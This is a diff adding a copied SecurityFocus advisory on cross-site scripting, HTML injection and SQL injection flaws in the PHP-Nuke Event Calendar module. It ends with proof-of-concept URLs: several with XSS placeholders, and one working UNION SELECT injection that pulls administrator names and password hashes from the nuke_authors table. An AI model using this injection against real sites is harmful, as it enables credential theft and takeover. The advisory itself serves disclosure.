@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/11693/info
+
+Event Calendar is prone to multiple input validation vulnerabilities. These issues include HTML injection and cross-site scripting. The following specific vulnerabilities were reported:
+
+A cross-site scripting vulnerability is exposed through certain NukeCalendar URI parameters. This issue could be exploited via a malicious link to a site hosting the software to execute hostile HTML and script content in the browser of a victim user.
+
+A HTML injection vulnerability is reported to affect the events comments input forms. This issue could be exploited when an unsuspecting user views a malicious event comment, this will result in attacker-supplied HTML and script content executing in the browser of the victim user.
+
+An SQL injection vulnerability is also present through URI parameters of the affected software, which includes unsanitized user input in database queries. This may be exploited to extract sensitive information from the database.
+
+http://www.example.com/nuke73/modules.php?name=Calendar&file=submit&type=[xss code here]
+http://www.example.com/nuke73/modules.php?name=Calendar&file=submit&op2=Preview&day=[xss code here]
+http://www.example.com/nuke73/modules.php?name=Calendar&file=submit&op2=Preview&month=[xss code here]
+http://www.example.com/nuke73/modules.php?name=Calendar&file=submit&op2=Preview&year=[xss code here]
+http://www.example.com/nuke73/modules.php?name=Calendar&file=submit&op2=Preview&type=[xss code here]
+http://www.example.com/nuke73/modules.php?name=Calendar&file=index&type=view&eid=-99%20UNION%20ALL%20SELECT%201,1,aid,1,pwd,1,1,1,1,1,1,1,1,1,1%20FROM%20nuke_authors%20WHERE%20radminsuper=1
